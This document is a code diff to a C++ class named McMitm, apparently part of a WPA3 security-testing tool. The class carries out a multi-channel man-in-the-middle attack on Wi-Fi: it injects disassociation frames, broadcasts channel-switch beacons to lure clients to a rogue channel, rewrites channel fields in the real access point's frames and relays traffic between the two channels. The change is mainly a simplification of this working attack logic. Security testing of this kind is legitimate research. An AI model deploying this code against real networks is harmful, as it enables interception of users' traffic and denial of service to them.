@@ -3,6 +3,7 @@
 #include <cstring>
 #include <chrono>
 #include <thread>
+#include <utility>
 #include <tins/tins.h>
 
 #include "attacks/DoS_soft/channel_switch/channel_switch.h"
@@ -15,18 +16,14 @@ namespace wpa3_tester{
     using namespace chrono;
     using namespace Tins;
 
-    McMitm::McMitm(const string& nic_real,
-                   const string& nic_rogue,
-                   const string& nic_real_mon,
-                   const string& nic_rogue_mon,
-                   const string& ssid,
-                   const string& client_mac)
-        : nic_real_ap(nic_real),
-          nic_rogue_ap(nic_rogue),
-          nic_real_mon(nic_real_mon),
-          nic_rogue_mon(nic_rogue_mon),
-          ssid(ssid),
-          client_mac(client_mac)
+    McMitm::McMitm(string  nic_real,
+                   string  nic_rogue,
+                   string  ssid,
+                   string  client_mac)
+        : nic_real_ap(move(nic_real)),
+          nic_rogue_ap(move(nic_rogue)),
+          ssid(move(ssid)),
+          client_mac(move(client_mac))
     {}
 
     McMitm::~McMitm() { stop(); }
@@ -47,11 +44,11 @@ namespace wpa3_tester{
         pkt.addr2(HWAddress<6>(ap_mac));
         pkt.addr3(HWAddress<6>(ap_mac));
         pkt.reason_code(0);
-        sender_rogue->send(pkt, nic_rogue_mon);
+        sender_rogue->send(pkt, nic_real_ap);
         log(LogLevel::INFO, "Rogue channel: injected Disassociation to " + macaddr);
     }
 
-      static uint16_t get_seq_num(const Dot11& pkt) {
+    static uint16_t get_seq_num(const Dot11& pkt) {
         if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>())
             return mgmt->seq_num();
         if (const auto* data = pkt.find_pdu<Dot11Data>())
@@ -60,7 +57,7 @@ namespace wpa3_tester{
     }
 
     void McMitm::run(const int timeout_sec) {
-        probe_resp.reset(beacon_to_probe_resp(*beacon));
+        probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
 
         //FIXME this should be optimalization, how it should works?
         /*Dot11Deauthentication deauth;
@@ -80,11 +77,7 @@ namespace wpa3_tester{
             return;
         }
 
-        for (int i = 0; i < 5; ++i) {
-            CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
-                                        netconfig.real_channel, netconfig.rogue_channel, 1);
-            this_thread::sleep_for(milliseconds(20));
-        }
+        CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);
 
        // CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
        //                             netconfig.real_channel, netconfig.rogue_channel);
@@ -117,7 +110,7 @@ namespace wpa3_tester{
             }*/
 
             if (next_beacon <= now_sec()) {
-                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+                CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
                 next_beacon += 0.10;
             }
 
@@ -150,115 +143,108 @@ namespace wpa3_tester{
         att_rogue->up_sniff_iface();
     }
 
+    void dump_hex(const string& label, const vector<uint8_t>& data, size_t limit = 64) {
+        cerr << "--- " << label << " (size: " << data.size() << ") ---" << endl;
+        for (size_t i = 0; i < min(data.size(), limit); ++i) {
+            cerr << hex << setw(2) << setfill('0') << static_cast<int>(data[i]) << " ";
+            if ((i + 1) % 16 == 0) cerr << endl;
+        }
+        cerr << dec << endl;
+    }
+
+    void McMitm::patch_channel_raw(vector<uint8_t> &raw, const uint8_t channel) {
+        if (raw.size() < 4) return;
+        //dump_hex("BEFORE PATCH", raw, 48);
+
+        size_t effective_size = raw.size();
+        RadioTap rt(raw.data(), raw.size());
+        if ((rt.present() & RadioTap::FLAGS) && (rt.flags() & RadioTap::FCS)) {
+            effective_size -= 4; // get off FCS
+        }
+
+        // 2. Patch RadioTap - frekvence (libtins vyřeší offsety za tebe)
+        //FIXME radiohead dont change channel
+        //constexpr uint16_t channel_flags = RadioTap::OFDM | RadioTap::TWO_GZ;
+        //rt.channel(hw_capabilities::channel_to_freq(channel), channel_flags);
+
+        const vector<uint8_t> rt_patched = rt.serialize();
+        const uint16_t old_rt_len = raw[2] | (raw[3] << 8);
+
+        const long   header_fixed    = old_rt_len + 24 + 12;
+        vector new_raw(raw.begin(), raw.begin() + header_fixed);
+
+        //std::cerr << "old_rt_len=" << old_rt_len
+      //<< " rt_patched.size()=" << rt_patched.size() << std::endl;
+
+        size_t pos = header_fixed; // Tag parsing
+        while (pos + 2 <= effective_size) {
+            const uint8_t id  = raw[pos];
+            const uint8_t len = raw[pos + 1];
+
+            if (pos + 2 + len > raw.size()) {
+                cerr << "ERR: Malformed IE at pos " << pos << " (ID: " << static_cast<int>(id) << ")" << endl;
+                break;
+            }
+            // Patching logic
+            if (id == Dot11::DS_SET && len == 1) {
+                cerr << "Patching DS from " << static_cast<int>(raw[pos+2])
+         << " to " << static_cast<int>(channel) << " at pos " << pos << endl;
+                raw[pos + 2] = channel; // DS Parameter
+            } else if (id == Dot11::HT_OPERATION && len >= 1) {
+                raw[pos + 2] = channel; // HT Operation
+            }
+
+            new_raw.insert(new_raw.end(), raw.begin() + static_cast<long>(pos), raw.begin() + static_cast<long>(pos) + 2 + len);
+            pos += 2 + len;
+        }
+
+        raw = std::move(new_raw);
+        //dump_hex("AFTER PATCH", raw, 48);
+    }
+
     void McMitm::handle_rx_real_chan(PDU& pdu) {
         const auto* dot11 = pdu.find_pdu<Dot11>();
         if (!dot11) return;
 
         const string addr1 = dot11->addr1().to_string();
         string addr2;
-        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>()) {
+        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>())
             addr2 = mgmt->addr2().to_string();
-        } else if (const auto* data = pdu.find_pdu<Dot11Data>()) {
+        else if (const auto* data = pdu.find_pdu<Dot11Data>())
             addr2 = data->addr2().to_string();
-        }
 
-        // Probe requests
-        if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::PROBE_REQ) {
-            probe_resp->addr1(HWAddress<6>(addr2));
-            sender_real->send(*probe_resp, nic_real_mon);
-            last_print_real_chan = display_client_traffic(*dot11, "Real channel", last_print_real_chan, " -- Replied");
-            return;
-        }
-
-        // Frames sent TO the real AP
+        // Frames from client TO real AP — push back to rogue channel via CSA
         if (addr1 == ap_mac) {
-            if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::AUTH) {
-                print_rx(LogLevel::INFO, "Real channel", *dot11);
-
-                if (client_mac == addr2)
-                    log(LogLevel::WARNING, "Client "+client_mac+" is connecting on real channel, injecting CSA beacon to try to correct.");
-
-                clients.erase(addr2);
-                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
-                CSA_attack::send_CSA_beacon("ff:ff:ff:ff:ff:ff", nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
-
-                auto client = make_unique<ClientState>(addr2);
-                client->update_state(ClientState::Connecting);
-                clients[client->macaddr] = std::move(client);
-
-            } else if (dot11->type() == Dot11::MANAGEMENT &&
-                       (dot11->subtype() == Dot11::DEAUTH || dot11->subtype() == Dot11::DISASSOC)) {
-                print_rx(LogLevel::INFO, "Real channel", *dot11);
-                 clients.erase(addr2);
-
-            } else if (auto* client = find_client(addr2)) {
-                client->last_real = display_client_traffic(*dot11, "Real channel", client->last_real);
-
-            } else if (!client_mac.empty() && client_mac == addr2) {
-                last_print_rogue_chan = display_client_traffic(*dot11, "Real channel", last_print_rogue_chan);
+            if (dot11->subtype() == Dot11::AUTH) {
+                log(LogLevel::WARNING, "Client %s connecting on real channel, sending CSA", addr2.c_str());
+                CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid,
+                                            netconfig.real_channel, netconfig.rogue_channel, 1);
             }
-
-            // Warn if client is going to sleep (power management bit in FC)
-            if ( dot11->power_mgmt() != 0) {
-                const auto* c = find_client(addr2);
-                if (c && c->state < ClientState::Attack_Done) {
-                    log(LogLevel::WARNING, "Client " + addr2 + " is going to sleep while on real channel. Injecting Null frame.");
-                    Dot11Data null_frame;
-                    null_frame.type(Dot11::DATA);
-                    null_frame.subtype(Dot11::DATA_NULL);
-                    null_frame.addr1(HWAddress<6>(ap_mac));
-                    null_frame.addr2(HWAddress<6>(addr2));
-                    null_frame.addr3(HWAddress<6>(ap_mac));
-                    sender_real->send(null_frame, nic_real_mon);
-                }
-            }
-            return;
+            print_rx(LogLevel::DEBUG, "Real channel", *dot11);
+            return; // don't forward client→AP frames from real channel, they belong on rogue
         }
 
-        // 3. Frames sent BY the real AP
+        // Frames from real AP — forward to rogue channel with patched channel IE
         if (addr2 == ap_mac) {
-            // Track beacons for watchdog
-            if (dot11->subtype() == Dot11::BEACON) {
-                const auto* b = pdu.find_pdu<Dot11Beacon>();
-                const auto* ch_ie = b ? get_element(*b, IEEE_TLV_TYPE_CHANNEL) : nullptr;
-                if (ch_ie && ch_ie->data_ptr()[0] == netconfig.real_channel)
-                    last_real_beacon = now_sec();
-            }
+            if (dot11->subtype() == Dot11::BEACON)
+                last_real_beacon = now_sec();
 
-            bool might_forward = false;
-            if (const auto* client = find_client(addr1))
-                might_forward = client->should_forward(pdu);
-            if (dot11_is_group(*dot11))
-                might_forward = true;
+            // Serialize, patch raw bytes, resend
+            auto raw = pdu.serialize();
+            patch_channel_raw(raw, netconfig.rogue_channel);
 
-            const bool is_deauth_or_disas = (dot11->type() == Dot11::MANAGEMENT &&
-                                             (dot11->subtype() == Dot11::DEAUTH ||
-                                              dot11->subtype() == Dot11::DISASSOC));
-            if (is_deauth_or_disas) {
-                print_rx(LogLevel::INFO, "Real channel", *dot11, might_forward ? " -- MitM'ing" : "");
-            } else if (!client_mac.empty() && client_mac == addr1) {
-                last_print_rogue_chan = display_client_traffic(*dot11, "Real channel",
-                                                               last_print_rogue_chan, might_forward ? " -- MitM'ing" : "");
-            } else if (might_forward) {
-                print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
-            }
+            const uint16_t rt_len = *reinterpret_cast<const uint16_t*>(raw.data() + 2);
+            RawPDU dot11_only(raw.data() + rt_len, raw.size() - rt_len);
 
-            if (might_forward) {
-                if (auto* client = find_client(addr1)) {
-                    auto* modified = client->modify_packet(&pdu);
-                    if (auto* mod_dot11 = modified->find_pdu<Dot11>())
-                        sender_rogue->send(*mod_dot11, nic_rogue_mon);
-                }
-            }
+            /*RadioTap rt;
+            rt.inner_pdu(dot11_only);
+            sender_rogue->send(rt, nic_rogue_ap);*/
 
-            if (dot11->subtype() == Dot11::DEAUTH && dot11->type() == Dot11::MANAGEMENT)
-                del_client(addr1);
+            auto patched = RawPDU(raw.data(), raw.size());
+            sender_rogue->send(patched, nic_rogue_ap);
+            print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
             return;
         }
-
-        // 4. Any other frame involving the targeted client
-        if (!client_mac.empty() && (client_mac == addr1 || client_mac == addr2))
-            last_print_rogue_chan = display_client_traffic(*dot11, "Real channel", last_print_rogue_chan);
     }
 
     void McMitm::handle_rx_rogue_chan(PDU& pdu) {
@@ -267,78 +253,24 @@ namespace wpa3_tester{
 
         const string addr1 = dot11->addr1().to_string();
         string addr2;
-        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>()) {
+        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>())
             addr2 = mgmt->addr2().to_string();
-        } else if (const auto* data = pdu.find_pdu<Dot11Data>()) {
+        else if (const auto* data = pdu.find_pdu<Dot11Data>())
             addr2 = data->addr2().to_string();
-        }
 
-        // 1. Frames sent by our own rogue AP interface
+        // Frames forwarded from real AP — our own frames coming back, ignore
         if (addr2 == ap_mac) {
-            if (dot11->subtype() == Dot11::BEACON) {
-                const auto* b = pdu.find_pdu<Dot11Beacon>();
-                const auto* ch_ie = b ? get_element(*b, IEEE_TLV_TYPE_CHANNEL) : nullptr;
-                if (ch_ie && ch_ie->data_ptr()[0] == netconfig.rogue_channel)
-                    last_rogue_beacon = now_sec();
-            }
-            if (!client_mac.empty() && addr1 == client_mac)
-                last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan);
-            else if (auto* client = find_client(addr1))
-                client->last_rogue = display_client_traffic(*dot11, "Rogue channel", client->last_rogue);
+            if (dot11->subtype() == Dot11::BEACON)
+                last_rogue_beacon = now_sec();
             return;
         }
 
-        // 2. Probe requests on rogue channel
-        if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::PROBE_REQ) {
-            CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
-                            netconfig.real_channel, netconfig.rogue_channel, 1);
-            probe_resp->addr1(HWAddress<6>(addr2));
-            sender_rogue->send(*probe_resp, nic_rogue_mon);
-            last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan, " -- Replied");
-            return;
-        }
-
-        // 3. Frames sent TO the AP (from clients)
+        // Frames from client -> AP
         if (addr1 == ap_mac) {
-            ClientState* client = find_client(addr2);
-            bool will_forward = false;
-
-            const bool is_auth_or_asso = (dot11->type() == Dot11::MANAGEMENT &&
-                                          (dot11->subtype() == Dot11::AUTH ||
-                                           dot11->subtype() == Dot11::ASSOC_REQ));
-            if (client) {
-                will_forward = client->should_forward(pdu);
-
-                if (is_auth_or_asso || client->state <= ClientState::Connecting) {
-                    print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
-                    client->mark_got_mitm();
-                } else {
-                    client->last_rogue = display_client_traffic(*dot11, "Rogue channel",
-                                                                client->last_rogue, " -- MitM'ing");
-                }
-            } else if (is_auth_or_asso || dot11->type() == Dot11::DATA) {
-                print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
-                auto new_client = make_unique<ClientState>(addr2);
-                new_client->mark_got_mitm();
-                add_client(std::move(new_client));
-                client = find_client(addr2);
-                will_forward = true;
-            } else if (!client_mac.empty() && addr2 == client_mac) {
-                last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan);
-            }
-
-            if (client && will_forward) {
-                if (dot11->power_mgmt() != 0 && client->state < ClientState::Attack_Done) {
-                    log(LogLevel::WARNING, "Client " + addr2 + " is going to sleep while on rogue channel. Removing sleep bit.");
-                }
-                sender_real->send(*dot11, nic_real_mon);
-            }
+            print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
+            sender_real->send(*dot11, nic_real_ap);
             return;
         }
-
-        // 4. Any other frame involving the targeted client
-        if (!client_mac.empty() && (client_mac == addr1 || client_mac == addr2))
-            last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan);
     }
 
     string McMitm::frame_to_str(const Dot11& pkt) {
@@ -370,7 +302,7 @@ namespace wpa3_tester{
             { ss << "QoS-Null(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
         }
 
-        ss << "Frame(type=" << pkt.type() << ",sub=" << pkt.subtype() << ")";
+        ss << "Frame(type=" << static_cast<int>(pkt.type()) << ",sub=" << static_cast<int>(pkt.subtype()) << ")";
         return ss.str();
     }
 
